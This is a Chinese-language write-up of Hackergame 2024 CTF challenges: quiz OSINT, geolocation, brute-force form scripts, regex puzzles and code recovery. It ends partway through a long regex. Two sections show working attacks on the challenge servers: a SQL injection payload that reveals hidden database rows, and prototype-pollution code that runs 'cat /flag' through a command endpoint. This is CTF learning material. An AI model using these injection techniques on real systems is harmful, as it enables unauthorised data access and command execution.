# PRO-2684 writeup

> Blog post URL: [Hackergame 2024 WP](https://pro-2684.github.io/?page=hg2024)

## 签到

```javascript
const seps = ["：", ": "];
const inputs = $$("#inputs-container > input");
inputs.forEach(input => {
    for (const sep of seps) {
        if (input.placeholder.includes(sep)) {
            input.value = input.placeholder.split(sep)[1];
            break;
        }
    }
});
```

## 喜欢做签到的 CTFer 你们好呀

首先进入招新主页: https://www.nebuu.la/

> 貌似不太好搜到，这个我还是从 Nebula 聊天记录里找到的（

- 经典 `ls` 起手，貌似没有啥有用的
- 那就 `ll`，提示 `command not found`
- `ls -la`，发现 `.flag` 文件
- `cat .flag`，得到 flag (Part2: Checkin Again & Again)
- 查看 `help`，得到可用命令列表
- 一个一个试，发现 `env` 可以查看环境变量，其中就有 `FLAG` (Part1: Checkin Again)

> 小声 BB：怎么不能通过 `echo $FLAG` 来查看呢？

一些小彩蛋：

- 尝试 `cd` 时会提示 `Permission denied: root needed`
- 尝试 `su`，提示 `command not found`
- 尝试 `sudo`，提示 `Permission denied: with little power comes... no responsibility?`，同时会跳转到 [神秘网站](https://www.bilibili.com/bangumi/play/ss40551)

## 猫咪问答（Hackergame 十周年纪念版）

### 在 Hackergame 2015 比赛开始前一天晚上开展的赛前讲座是在哪个教室举行的？（30 分）

https://lug.ustc.edu.cn/wiki/lug/events/hackergame/ -> https://lug.ustc.edu.cn/wiki/sec/contest.html#:~:text=%E6%99%9A%E4%B8%8A%2019%3A30-,3A204,-%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E6%8A%80%E5%B7%A7

### 众所周知，Hackergame 共约 25 道题目。近五年（不含今年）举办的 Hackergame 中，题目数量最接近这个数字的那一届比赛里有多少人注册参加？（30 分）

`https://github.com/USTC-Hackergame/hackergame20<x>-writeups`, 将 `19` - `23` 即可查看题目数量。统计如下：

- 2023: 29
- 2022: 33
- 2021: 31
- 2020: 31
- 2019: N/A (未找到)

随后，分别查看 2023 和 2019 年的注册人数：

- [2023](https://lug.ustc.edu.cn/news/2023/12/hackergame-2023/): N/A (未找到具体人数)
- [2019](https://news.ustclug.org/2019/12/hackergame-2019/#:~:text=%E6%9C%AC%E6%AC%A1%E6%AF%94%E8%B5%9B%E4%B8%AD%EF%BC%8C-,%E6%80%BB%E5%85%B1%E6%9C%89%202682%20%E4%BA%BA%E6%B3%A8%E5%86%8C,-%EF%BC%8C1904%20%E4%BA%BA%E8%87%B3%E5%B0%91): 2682

尝试提交 `2682`，答案正确。

### Hackergame 2018 让哪个热门检索词成为了科大图书馆当月热搜第一？

- 搜索 `Hackergame 2018`，找到当年的 WP: [hackergame2018-writeups](https://github.com/ustclug/hackergame2018-writeups/)
- 首先查看签到题和猫咪问答的题干与解答，可以在猫咪问答中发现如下描述：

> 在中国科大图书馆中，有一本书叫做《程序员的自我修养:链接、装载与库》，请问它的索书号是？
> 打开中国科大图书馆主页，直接搜索“程序员的自我修养”即可。

那么尝试提交 `程序员的自我修养`，答案正确。

### 在今年的 USENIX Security 学术会议上中国科学技术大学发表了一篇关于电子邮件伪造攻击的论文，在论文中作者提出了 6 种攻击方法，并在多少个电子邮件服务提供商及客户端的组合上进行了实验？

询问 Microsoft Copilot，即可找到 [相关新闻稿](https://if.ustc.edu.cn/news/2024_08_20.php#:~:text=Topology%20Obfuscation%E2%80%9D%E5%92%8C%E2%80%9C-,FakeBehalf%3A%20Imperceptible%20Email%20Spoofing%20Attacks%20against%20the%20Delegation%20Mechansim%20in%20Email%20Systems,-%E2%80%9D%E8%A2%AB%E5%BD%95%E7%94%A8%EF%BC%8C%E4%B8%AD%E5%9B%BD)。显然，我们要找的论文题目就是 `FakeBehalf: Imperceptible Email Spoofing Attacks against the Delegation Mechansim in Email Systems`。

![hg2024-copilot](./images/hg2024-copilot.jpg)

进入 [USENIX Security '24](https://www.usenix.org/conference/usenixsecurity24) 官网，点击 ["technical sessions"](https://www.usenix.org/conference/usenixsecurity24/technical-sessions)。搜索关键词 "FakeBehalf"，即可找到 [此论文的链接](https://www.usenix.org/conference/usenixsecurity24/presentation/ma-jinrui)，在此页面中即可 [下载论文](https://www.usenix.org/system/files/usenixsecurity24-ma-jinrui.pdf)。

打开论文，搜索关键词 "combination"，即可找到相关描述：

> All 20 clients are configured as MUAs for all 16 providers via IMAP, resulting in 336 combinations (including 16 web interfaces of target providers).

尝试提交 `336`，答案正确。

### 10 月 18 日 Greg Kroah-Hartman 向 Linux 邮件列表提交的一个 patch 把大量开发者从 MAINTAINERS 文件中移除。这个 patch 被合并进 Linux mainline 的 commit id 是多少？

这是一个挺出名的事件，相信大部分人都听说过。我们直接进到 GitHub 上的 [linux](https://github.com/torvalds/linux) 仓库，查看 [MAINTAINERS 的相关 commit](https://github.com/torvalds/linux/commits/master/MAINTAINERS)，翻到相应时间，即可找到相关 commit: [MAINTAINERS: Remove some entries due to various compliance requirements.](https://github.com/torvalds/linux/commit/6e90b675cf942e50c70e8394dfb5862975c3b3b2)。那么尝试提交 `6e90b6`，答案正确。

### 大语言模型会把输入分解为一个一个的 token 后继续计算，请问这个网页的 HTML 源代码会被 Meta 的 Llama 3 70B 模型的 tokenizer 分解为多少个 token？

首先通过 [在线 Tokenizer](https://huggingface.co/spaces/Xenova/the-tokenizer-playground) 使用 `Llama 3` tokenize 当前页面的 HTML 源代码，得 token 数为 `1947`：

![hg2024-llama-tokenizer](./images/hg2024-llama-tokenizer.jpg)

由于这不是“第一次打开”，故尝试用脚本从 `1974` 开始递减，直到找到正确答案。

```javascript
const successTip = "本次测验总得分为 100。";
const formEl = document.querySelector("form.form-getflag");
const params = new URLSearchParams(new FormData(formEl));
let tokenCount = 1974;
async function checkTokenCount(cnt) {
    params.set("q6", cnt);
    const r = await fetch(location.href, {
        method: "POST",
        headers: {
            "Content-Type": "application/x-www-form-urlencoded"
        },
        body: params
    });
    const t = await r.text();
    return t.includes(successTip);
}
(async () => {
    while (true && tokenCount > 0) {
        if (await checkTokenCount(tokenCount)) {
            console.log("Found:", tokenCount);
            return;
        }
        tokenCount--;
    }
    console.log("Not found");
})();
```

最终结果：`1833`。

![hg2024-llama-result](./images/hg2024-llama-result.jpg)

## 比大小王

> 一开始想偷懒直接用 JS 模拟点击，发现还是太慢了，于是改用 Python 脚本

```python
from requests import Session
from time import sleep

HOST = "http://202.38.93.141:12122/"
TOKEN = "<TOKEN>"

x = Session()

def auth():
    r = x.post(HOST, params={"token": TOKEN}, allow_redirects=False)
    assert r.status_code == 302

def start():
    r = x.post(HOST + "game", json={})
    return r.json()

def solve(data):
    values = data["values"]
    inputs = []
    for a, b in values:
        if a > b:
            inputs.append(">")
        elif a < b:
            inputs.append("<")
        else:
            inputs.append("=")
    return inputs

def submit(inputs):
    r = x.post(HOST + "submit", json={"inputs": inputs})
    return r.json()

auth()
game = start()
inputs = solve(game)
sleep(5) # 3 or 4 is too fast
result = submit(inputs)
print(result)
```

## 打不开的盒

https://www.viewstl.com/ 上传文件，滚动鼠标，视角穿过盒子即可看到 flag

## 每日论文太多了！

使用福昕将论文转为 `.rtf` 格式，然后用 Word 打开，搜索关键词 `flag`。在 Figure 4 的 "Semantic Space" 图片下方可以看到关键词 flag。回到福昕，把此图片删除，即可看到被遮挡的 flag。

## 旅行照片 4.0

### 题目 1-2

#### 问题 1: 照片拍摄的位置距离中科大的哪个校门更近？（格式：X校区Y门，均为一个汉字）

[百度地图](https://map.baidu.com/search/%E4%B8%AD%E5%9B%BD%E8%9C%80%E5%B1%B1%E7%A7%91%E9%87%8C%E7%A7%91%E6%B0%94%E7%A7%91%E5%88%9B%E9%A9%BF%E7%AB%99(%E7%A7%91%E5%A4%A7%E7%AB%99)/@13054806.545,3720055.77,18.04z?querytype=s&wd=%E4%B8%AD%E5%9B%BD%E8%9C%80%E5%B1%B1%E7%A7%91%E9%87%8C%E7%A7%91%E6%B0%94%E7%A7%91%E5%88%9B%E9%A9%BF%E7%AB%99(%E7%A7%91%E5%A4%A7%E7%AB%99)&c=127&src=0&wd2=%E5%90%88%E8%82%A5%E5%B8%82%E8%9C%80%E5%B1%B1%E5%8C%BA&pn=0&sug=1&l=12&b=(12999309,3690787.5;13101709,3744867.5)&from=webmap&biz_forward=%7B%22scaler%22:2,%22styles%22:%22pl%22%7D&sug_forward=847a2f26f36115f5f33cba4a&device_ratio=2)，可知是 `中校区东门`/`东校区西门`。由于中校区没有东门，故填 `东校区西门`。

#### 问题 2: 话说 Leo 酱上次出现在桁架上是……科大今年的 ACG 音乐会？活动日期我没记错的话是？（格式：YYYYMMDD）

从 `20241031` 向前枚举。

```javascript
async function solveForm1() {
    const date = new Date("2024-10-31");
    const minDate = new Date("2024-01-01");
    const form1 = document.querySelector("#form1");
    const params = new URLSearchParams(new FormData(form1));
    params.set("Answer1", "东校区西门");
    async function test(date) {
        const dateStr = date.toISOString().split("T")[0].replace(/-/g, "");
        params.set("Answer2", dateStr);
        const r = await fetch(location.href, {
            method: "POST",
            headers: {
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
            },
            // Line 36: btoa($(this).serialize()) + ".txt";
            body: btoa(unescape(encodeURIComponent(params))) + ".txt"
        });
        return r.status !== 404;
    }
    while (date >= minDate) {
        date.setDate(date.getDate() - 1);
        if (await test(date)) {
            console.log("Found:", date);
            break;
        }
    }
}
solveForm1();
```

最终结果：`Sun May 19 2024` (`20240519`)

### 题目 3-4

#### 问题 3: 这个公园的名称是什么？（不需要填写公园所在市区等信息）

这张图的主要关注点应该就是彩虹跑道了。直接谷歌搜图的话是难以找到有效结果的，所以我们聚焦到彩虹跑道上：

![hg2024-rainbow-track-1](./images/hg2024-rainbow-track-1.jpg)

可以看到，第一个结果的彩虹颜色、方向等均与给定图片相符，那么我们点进链接查看相关信息。很不幸的是，[这个链接](https://www.sohu.com/a/499750254_99986045) 已经 404 了，我们只能复制它的图片进行二次搜图：

![hg2024-rainbow-track-2](./images/hg2024-rainbow-track-2.jpg)

运气不错，好歹 [第二个结果](https://www.sohu.com/a/500416746_100023473#:~:text=%E6%97%A5%EF%BC%8C%E5%B8%82%E6%B0%91%E5%9C%A8-,%E5%9F%8E%E5%8C%BA%E4%B8%AD%E5%A4%AE%E5%85%AC%E5%9B%AD,-%E5%86%85%E5%81%A5%E8%BA%AB%E3%80%81%E4%BC%91%E9%97%B2) 是可以打开的。那么我们就尝试提交 `城区中央公园`/`中央公园`，最终结果为 `中央公园`。

#### 问题 4: 这个景观所在的景点的名字是？（三个汉字）

直接谷歌搜图，可知是位于宜昌的 `坛子岭`。

### 题目 5-6

#### 🔴 问题 5: 距离拍摄地最近的医院是？（无需包含院区、地名信息，格式：XXX医院）

找不到。byd `重庆西动车运用所` 和 `怀柔—密云线` 都找过了，结果看 WP 发现照片是在 [`北京北动车运用所`](https://map.baidu.com/search/%E5%8C%97%E4%BA%AC%E5%8C%97%E5%8A%A8%E8%BD%A6%E8%BF%90%E7%94%A8%E6%89%80/@12947392.800727855,4848935.849935234,17.8z/maptype%3DB_EARTH_MAP?querytype=s&wd=%E5%8C%97%E4%BA%AC%E5%8C%97%E5%8A%A8%E8%BD%A6%E8%BF%90%E7%94%A8%E6%89%80&c=131&src=0&wd2=%E5%8C%97%E4%BA%AC%E5%B8%82%E6%98%8C%E5%B9%B3%E5%8C%BA&pn=0&sug=1&l=15&b=(12959151,4819384;12971951,4826144)&biz_forward=%7B%22scaler%22:2,%22styles%22:%22pl%22%7D&sug_forward=5cb2285dcb8c33d7f7e73bcc&device_ratio=2)。看来还是 Not Powerful Enough :)

![hg2024-station.jpg](./images/hg2024-station.jpg)

那么很显然了，周边搜索“医院”，答案就是 `积水潭医院`。

![hg2024-hospital.jpg](./images/hg2024-hospital.jpg)

#### 问题 6: 左下角的动车组型号是？

谷歌搜图，聚焦到左下角的动车组。可以发现第一个结果不能说十分相似，只能说一模一样。

![hg2024-train](./images/hg2024-train.jpg)

`CRH6F-A`。

## PaoluGPT

### 千里挑一

根据标题的提示，综合 `/list` 界面总共有 999 条对话，可以猜测 flag 藏在聊天记录中。遂编写脚本爬取聊天记录，查找 flag。

```python
from requests import Session # pip install requests
from bs4 import BeautifulSoup # pip install beautifulsoup4
from re import compile

HOST = "chal01-x43lv6ik.hack-challenge.lug.ustc.edu.cn:8443"
SESSION = "<SESSION>"
FLAG_REGEX = compile(r"flag\{.*\}")

x = Session()
x.cookies.set("session", SESSION)

historyHTML = x.get(f"https://{HOST}/list").text
soup = BeautifulSoup(historyHTML, "html.parser")

# <ul>
#     <li><a href="/view?conversation_id=<id>">Title</a></li>
#     ...
# </ul>

# Get a list of conversations
conversations = {}
conversationsEl = soup.find("ul")
for conversationEl in conversationsEl.find_all("li"):
    # Get the conversation ID
    conversationId = conversationEl.find("a")["href"].split("=")[1]
    # Get the conversation title
    title = conversationEl.find("a").text
    print(conversationId, title)
    # Get the conversation content
    conversationHTML = x.get(f"https://{HOST}/view?conversation_id={conversationId}").text
    soup = BeautifulSoup(conversationHTML, "html.parser")
    # <div class="container pt-3">
    #     <h2>聊天记录：prompt</h2>
    #     <div style="white-space: pre-line;">response</div>
    # </div>
    content = soup.find("div", class_="container pt-3")
    prompt = content.find("h2").text
    response = content.find("div").text
    conversations[conversationId] = {
        "prompt": prompt,
        "response": response
    }
    m = FLAG_REGEX.search(response)
    if m:
        print("* Flag found! Prompt:", prompt)
        print(m.group())
        break
```

### 窥见未知

根据标题的提示，合理推测有一条对话被隐藏了，而隐藏的对话很有可能含有第二个 flag。查看附件，重点关注如下代码：

```python
@app.route("/list")
def list():
    results = execute_query("select id, title from messages where shown = true", fetch_all=True)
    messages = [Message(m[0], m[1], None) for m in results]
    return render_template("list.html", messages=messages)

@app.route("/view")
def view():
    conversation_id = request.args.get("conversation_id")
    results = execute_query(f"select title, contents from messages where id = '{conversation_id}'")
    return render_template("view.html", message=Message(None, results[0], results[1]))
```

注意到可疑的 `shown` 字段，遂尝试注入如下 Query：

```
' or shown=false or '
```

那么最终执行的 SQL 语句为：

```sql
select title, contents from messages where id = '1' or shown=false or ''
```

即可查看未显示的对话。据此编写脚本：

```python
r = x.get(f"https://{HOST}/view?conversation_id=1' or shown=false or '")
m = FLAG_REGEX.search(r.text)
if m:
    print("* Flag 2 found!")
    print(m.group())
```

注意需要将结果中的 `&amp;` 替换为 `&`。实际上也可以浏览器中直接访问 `/view?conversation_id=1' or shown=false or '`，然后滚动到底部查看 flag。

## 惜字如金 3.0

### 题目 A

这题丢失的信息量比较少，先直接喂给 ChatGPT 进行处理，然后提交查看不一致的地方，最后手动修正。附上 [ChatGPT 的聊天记录](https://chatgpt.com/share/672a29f8-bddc-800f-a004-bc03bdec4299)。

得到 AI 修复的文件后，手动补一下空格并修改被 ChatGPT 误判的地方，得到 flag。没有什么特别的地方。原文件：

```python
#!/usr/bin/python3

import atexit, base64, flask, itertools, os, re


def crc(input: bytes) -> int:
    poly, poly_degree = 'AaaaaaAaaaAAaaaaAAAAaaaAAAaAaAAAAaAAAaaAaaAaaAaaA', 48
    assert len(poly) == poly_degree + 1 and poly[0] == poly[poly_degree] == 'A'
    flip = sum(['a', 'A'].index(poly[i + 1]) << i for i in range(poly_degree))
    digest = (1 << poly_degree) - 1
    for b in input:
        digest = digest ^ b
        for _ in range(8):
            digest = (digest >> 1) ^ (flip if digest & 1 == 1 else 0)
    return digest ^ (1 << poly_degree) - 1


def hash(input: bytes) -> bytes:
    digest = crc(input)
    u2, u1, u0 = 0xCb4EcdfD0A9F, 0xa9dec1C1b7A3, 0x60c4B0aAB4Bf
    assert (u2, u1, u0) == (223539323800223, 186774198532003, 106397893833919)
    digest = (digest * (digest * u2 + u1) + u0) % (1 << 48)
    return digest.to_bytes(48 // 8, 'little')


def xzrj(input: bytes) -> bytes:
    pat, repl = rb'([B-DF-HJ-NP-TV-Z])\1*(E(?![A-Z]))?', rb'\1'
    return re.sub(pat, repl, input, flags=re.IGNORECASE)


paths: list[bytes] = []

xzrj_bytes: bytes = bytes()

with open(__file__, 'rb') as f:
    for row in f.read().splitlines():
        row = (row.rstrip() + b' ' * 80)[:80]
        path = base64.b85encode(hash(row)) + b'.txt'
        with open(path, 'wb') as pf:
            pf.write(row)
            paths.append(path)
            xzrj_bytes += xzrj(row) + b'\r\n'

    def clean():
        for path in paths:
            try:
                os.remove(path)
            except FileNotFoundError:
                pass

    atexit.register(clean)


bp: flask.Blueprint = flask.Blueprint('answer_a', __name__)


@bp.get('/answer_a.py')
def get() -> flask.Response:
    return flask.Response(xzrj_bytes, content_type='text/plain; charset=UTF-8')


@bp.post('/answer_a.py')
def post() -> flask.Response:
    wrong_hints = {}
    req_lines = flask.request.get_data().splitlines()
    iter = enumerate(itertools.zip_longest(paths, req_lines), start=1)
    for index, (path, req_row) in iter:
        if path is None:
            wrong_hints[index] = 'Too many lines for request data'
            break
        if req_row is None:
            wrong_hints[index] = 'Too few lines for request data'
            continue
        req_row_hash = hash(req_row)
        req_row_path = base64.b85encode(req_row_hash) + b'.txt'
        if not os.path.exists(req_row_path):
            wrong_hints[index] = f'Unmatched hash ({req_row_hash.hex()})'
            continue
        with open(req_row_path, 'rb') as pf:
            row = pf.read()
            if len(req_row) != len(row):
                wrong_hints[index] = f'Unmatched length ({len(req_row)})'
                continue
            unmatched = [req_b for b, req_b in zip(row, req_row) if b != req_b]
            if unmatched:
                wrong_hints[index] = f'Unmatched data (0x{unmatched[-1]:02X})'
                continue
            if path != req_row_path:
                wrong_hints[index] = f'Matched but in other lines'
                continue
    if wrong_hints:
        return {'wrong_hints': wrong_hints}, 400
    with open('answer_a.txt', 'rb') as af:
        answer_flag = base64.b85decode(af.read()).decode()
        closing, opening = answer_flag[-1:], answer_flag[:5]
        assert closing == '}' and opening == 'flag{'
        return {'answer_flag': answer_flag}, 200
```

### 🔴 题目 B

手动补一下空格并修改被 ChatGPT 误判的地方，发现有一行需要特别注意。惜字如金化后的这一行是：

```python
    poly, poly_degree = 'B', 48
```

注意到这一行只有 $32$ 个字符，而根据说明，每一行应该都有 $80$ 个字符。因此，我们需要在 `B` 后面补上 $48$ 个合适的字符，使得整行长度为 $80$。根据 `creat` 规则，此字符串有可能由一个 `e`/`E` 结尾；根据 `referer` 规则，剩余部分应该均为 `b`/`B`。

注意到下一行代码：

```python
assert len(poly) == poly_degree + 1 and poly[0] == poly[poly_degree] == 'B'
```

那么我们可以推断出，`poly` 应为 `BxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxB` 的形式，其中 `x` 为 `b`/`B`。然后不会了（悲

## Node.js is Web Scale

考虑原型链污染，从而将任意命令注入到 `cmds`。

1. 设置 `store.__proto__.cmd1` 为 `"cat /flag"`
2. 此时，所有的对象都会继承这个属性，也就是说 `cmds.cmd1 === "cat /flag"`
3. 调用 `/execute` 接口即可执行命令

```javascript
const params = new URLSearchParams();
function set(key, value) {
    fetch("/set", {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({ key, value })
    }).then(r => r.text()).then(console.log);
}
function execute(cmd) {
    params.set("cmd", cmd);
    fetch("/execute?" + params.toString()).then(r => r.text()).then(console.log);
}
// Prototype chain pollution
set("__proto__.cmd1", "cat /flag");
// Call the command
execute("cmd1");
```

如果不想用代码，也可以手动操作：

1. 在 `Set Key-Value Pair` 中设置 Key 为 `__proto__.cmd1`，Value 为 `cat /flag`
2. 打开链接 `https://chal03-y5v7klns.hack-challenge.lug.ustc.edu.cn:8443/execute?cmd=cmd1`

## 强大的正则表达式

### Easy

> 编写一个正则表达式，匹配可被 $16$ 整除的十进制数。

注意到 $2000$ 可被 $16$ 整除，因此判断一个十进制数的字符串是否可被 $16$ 整除，可以首先判断倒数第 $4$ 位的奇偶性，然后判断后 $3$ 位是否满足规律。使用如下 Python 脚本生成正则表达式：

```python
prefix = "(0|1|2|3|4|5|6|7|8|9)*" # 匹配任意数
i = 0

# 倒数第四位为偶数
part1 = "(0|2|4|6|8)("
while i < 1000:
    part1 += f"{i:03}|"
    i += 16
part1 = part1[:-1] + ")"

# 倒数第四位为奇数
part2 = "(1|3|5|7|9)("
while i < 2000:
    part2 += f"{i}|"[1:] # 去掉第一位
    i += 16
part2 = part2[:-1] + ")"

print(f"{prefix}({part1}|{part2})")
```

最终正则表达式为：

```
(0|1|2|3|4|5|6|7|8|9)*((0|2|4|6|8)(000|016|032|048|064|080|096|112|128|144|160|176|192|208|224|240|256|272|288|304|320|336|352|368|384|400|416|432|448|464|480|496|512|528|544|560|576|592|608|624|640|656|672|688|704|720|736|752|768|784|800|816|832|848|864|880|896|912|928|944|960|976|992)|(1|3|5|7|9)(008|024|040|056|072|088|104|120|136|152|168|184|200|216|232|248|264|280|296|312|328|344|360|376|392|408|424|440|456|472|488|504|520|536|552|568|584|600|616|632|648|664|680|696|712|728|744|760|776|792|808|824|840|856|872|888|904|920|936|952|968|984))
```

需要注意的是，这个正则表达式无法匹配小于 $1000$ 的数。但是由于判题脚本在 $[0, 2^{64}]$ 范围内随机生成数，并且判断次数为 $300$，因此只要运气不算差，就可以通过。经过简单的估算，可以得出通过的概率约为 $\left(\frac{2^{64}-1000}{2^{64}}\right)^{300} \approx 1$。

### Medium

> 编写一个正则表达式，匹配可被 $13$ 整除的二进制数

这题还是有点难度的。网上搜一搜，很容易找到 [被 $3$ 整除的二进制数的正则表达式](https://www.cnblogs.com/holdpassion/archive/2012/09/25/2703120.html)，而这利用了有限状态机与正则表达式的互相转换。

构造如下的有限状态机，其中各个状态 $s_k$ 的下标 $k$ 表示当前的余数，而状态之间的边 (字母表) $0$, $1$ 分别表示当前状态下读入 $0$, $1$：

<details><summary>有限状态机</summary>
```
#states
s00
s01
s02
s03
s04
s05
s06
s07
s08
s09
s10
s11
s12
#initial
s00
#accepting
s00
#alphabet
0
1
#transitions
s00:0>s00
s00:1>s01
s01:0>s02
s01:1>s03
s02:0>s04
s02:1>s05
s03:0>s06
s03:1>s07
s04:0>s08
s04:1>s09
s05:0>s10
s05:1>s11
s06:0>s12
s06:1>s00
s07:0>s01
s07:1>s02
s08:0>s03
s08:1>s04
s09:0>s05
s09:1>s06
s10:0>s07
s10:1>s08
s11:0>s09
s11:1>s10
s12:0>s11
s12:1>s12
```
</details>

前往 [FSM2Regex](https://ivanzuzak.info/noam/webapps/fsm2regex/)，将上述有限状态机粘贴到左侧，发现网页卡死。。看来还是得用 Python 来解决。

```python
from greenery import Fsm, Charclass
from greenery.rxelems import from_fsm

one = Charclass('1')
# zero = Charclass('0')
zero = ~one
transitionMap = {}

for i in range(13):
    transitionMap[f's{i:02d}'] = {
        zero: f's{(i * 2 % 13):02d}',
        one: f's{(i * 2 + 1) % 13:02d}'
    }

fsm = Fsm(
    alphabet={zero, one},
    states={'s00', 's01', 's02', 's03', 's04', 's05', 's06', 's07', 's08', 's09', 's10', 's11', 's12'},
    initial='s00',
    finals={'s00'},
    map=transitionMap
)
# reduced = fsm.reduce()

print(fsm.accepts('101110101010101010000111')) # True
print(fsm.accepts('101110101010101010000110')) # False
print(fsm.accepts('100100111110001110110101110100110110101110011010001100010100010')) # True
print(fsm.accepts('10100010001110001110011110001000000111011010001101110001001110')) # False

def processRegex(regex):
    # Only `0123456789()|*` are allowed
    regex = regex.replace("^1", "0").replace("[0]", "0")
    for i in range(13):
        regex = regex.replace(f'0{{{i}}}', '0' * i)
        regex = regex.replace(f'1{{{i}}}', '1' * i)
    return regex

pattern = from_fsm(fsm)
regex = processRegex(str(pattern))

print(regex)
print("Length:", len(regex))

# After: replace (group)? with ((group)|)
# https://regex101.com/r/D27KJC/1
```

由于长度过长，无法直接通过 `nc` 传输，因此使用 `pwntools`:

```python
from pwn import remote

token = "<token>"
level = "2"
regex = "(1(((1|0((((1|0(01)*10)(((11|0)11(01)*1|10)0)*((11|0)11(01)*1|10)|0(01)*1)1(01*0(111(01)*1|0)((0(((11|0)11(01)*1|10)0)*((11|0)11(01)*1|10))|)1)*01*0((111(01)*1|0)0(((11|0)11(01)*1|10)0)*(11|0)|1)|(1|0(01)*10)(((11|0)11(01)*1|10)0)*(11|0))01)*(((1|0(01)*10)(((11|0)11(01)*1|10)0)*((11|0)11(01)*1|10)|0(01)*1)1(01*0(111(01)*1|0)((0(((11|0)11(01)*1|10)0)*((11|0)11(01)*1|10))|)1)*01*0((111(01)*1|0)0(((11|0)11(01)*1|10)0)*(11|0)|1)1((1(01)*0)|)|((1|0(01)*10)(((11|0)11(01)*1|10)0)*(11|0)1((1(01)*0)|)|0(01)*0))0)(((1|0(01*0(111(01)*1|0)((0(((11|0)11(01)*1|10)0)*((11|0)11(01)*1|10))|)1)*01*0((111(01)*1|0)0(((11|0)11(01)*1|10)0)*(11|0)|1)0)1((((1|0(01)*10)(((11|0)11(01)*1|10)0)*((11|0)11(01)*1|10)|0(01)*1)1(01*0(111(01)*1|0)((0(((11|0)11(01)*1|10)0)*((11|0)11(01)*1|10))|)1)*01*0((111(01)*1|0)0(((11|0)11(01)*1|10)0)*(11|0)|1)|(1|0(01)*10)(((11|0)11(01)*1|10)0)*(11|0))01)*(((1|0(01)*10)(((11|0)11(01)*1|10)0)*((11|0)11(01)*1|10)|0(01)*1)1(01*0(111(01)*1|0)((0(((11|0)11(01)*1|10)0)*((11|0)11(01)*1|10))|)1)*01*0((111(01)*1|0)0(((11|0)11(01)*1|10)0)*(11|0)|1)1((1(01)*0)|)|((1|0(01)*10)(((11|0)11(01)*1|10)0)*(11|0)1((1(01)*0)|)|0(01)*0))|0(01*0(111(01)*1|0)((0(((11|0)11(01)*1|10)0)*((11|0)11(01)*1|10))|)1)*01*0((111(01)*1|0)0(((11|0)11(01)*1|10)0)*(11|0)|1)1((1(01)*0)|))0)*(1|0(01*0(111(01)*1|0)((0(((11|0)11(01)*1|10)0)*((11|0)11(01)*1|10))|)1)*01*0((111(01)*1|0)0(((11|0)11(01)*1|10)0)*(11|0)|1)0)((1((((1|0(01)*10)(((11|0)11(01)*1|10)0)*((11|0)11(01)*1|10)|0(01)*1)1(01*0(111(01)*1|0)((0(((11|0)11(01)*1|10)0)*((11|0)11(01)*1|10))|)1)*01*0((111(01)*1|0)0(((11|0)11(01)*1|10)0)*(11|0)|1)|(1|0(01)*10)(((11|0)11(01)*1|10)0)*(11|0))01)*(((1|0(01)*10)(((11|0)11(01)*1|10)0)*((11|0)11(01)*1|10)|0(01)*1)1(01*0(111(01)*1|0)((0(((11|0)11(01)*1|10)0)*((11|0)11(01)*1|10))|)1)*01*0((111(01)*1|0)0(((11|0)11(01)*1|10)0)*(11|0)|1)|(1|0(01)*10)(((11|0)11(01)*1|10)0)*(11|0))0)|)|0((((1|0(01)*10)(((11|0)11(01)*1|10)0)*((11|0)11(01)*1|10)|0(01)*1)1(01*0(111(01)*1|0)((0(((11|0)11(01)*1|10)0)*((11|0)11(01)*1|10))|)1)*01*0((111(01)*1|0)0(((11|0)11(01)*1|10)0)*(11|0)|1)|(1|0(01)*10)(((11|0)11(01)*1|10)0)*(11|0))01)*(((1|0(01)*10)(((11|0)11(01)*1|10)0)*((11|0)11(01)*1|10)|0(01)*1)1(01*0(111(01)*1|0)((0(((11|0)11(01)*1|10)0)*((11|0)11(01)*1|10))|)1)*01*0((111(01)*1|0)0(((11|0)11(01)*1|10)0)*(11|0)|1)|(1|0(01)*10)(((11|0)11(01)*1|10)0)*(11|0))0)0)*((1|0((((1|0(01)*10)(((11|0)11(01)*1|10)0)*((11|0)11(01)*1|10)|0(01)*1)1(01*0(111(01)*1|0)((0(((11|0)11(01)*1|10)0)*((11|0)11(01)*1|10))|)1)*01*0((111(01)*1|0)0(((11|0)11(01)*1|10)0)*(11|0)|1)|(1|0(01)*10)(((11|0)11(01)*1|10)0)*(11|0))01)*(((1|0(01)*10)(((11|0)11(01)*1|10)0)*((11|0)11(01)*1|10)|0(01)*1)1(01*0(111(01)*1|0)((0(((11|0)11(01)*1|10)0)*((11|0)11(01)*1|10))|)1)*01*0((111(01)*1|0)0(((11|0)11(01)*1|10)0)*(11|0)|1)1((1(01)*0)|)|((1|0(01)*10)(((11|0)11(01)*1|10)0)*(11|0)1((1(01)*0)|)|0(01)*0))0)(((1|0(01*0(111(01)*1|0)((0(((11|0)11(01)*1|10)0)*((11|0)11(01)*1|10))|)1)*01*0((111(01)*1|0)0(((11|0)11(01)*1|10)0)*(11|0)|1)0)1((((1|0(01)*10)(((11|0)11(01)*1|10)0)*((11|0)11(01)*1|10)|0(01)*1)1(01*0(111(01)*1|0)((0(((11|0)11(01)*1|10)0)*((11|0)11(01)*1|10))|)1)*01*0((111(01)*1|0)0(((11|0)11(01)*1|10)0)*(11|0)|1)|(1|0(01)*10)(((11|0)11(01)*1|10)0)*(11|0))01)*(((1|0(01)*10)(((11|0)11(01)*1|10)0)*((11|0)11(01)*1|10)|0(01)*1)1(01*0(111(01)*1|0)((0(((11|0)11(01)*1|10)0)*((11|0)11(01)*1|10))|)1)*01*0((111(01)*1|0)0(((11|0)11(01)*1|10)0)*(11|0)|1)1((1(01)*0)|)|((1|0(01)*10)(((11|0)11(01)*1|10)0)*(11|0)1((1(01)*0)|)|0(01)*0))|0(01*0(111(01)*1|0)((0(((11|0)11(01)*1|10)0)*((11|0)11(01)*1|10))|)1)*01*0((111(01)*1|0)0(((11|0)11(01)*1|10)0)*(11|0)|1)1((1(01)*0)|))0)*((1|0(01*0(111(01)*1|0)((0(((11|0)11(01)*1|10)0)*((11|0)11(01)*1|10))|)1)*01*0((111(01)*1|0)0(((11|0)11(01)*1|10)0)*(11|0)|1)0)1((((1|0(01)*10)(((11|0)11(01)*1|10)0)*((11|0)11(01)*1|10)|0(01)*1)1(01*0(111(01)*1|0)((0(((11|0)11(01)*1|10)0)*((11|0)11(01)*1|10))|)1)*01*0((111(01)*1|0)0(((11|0)1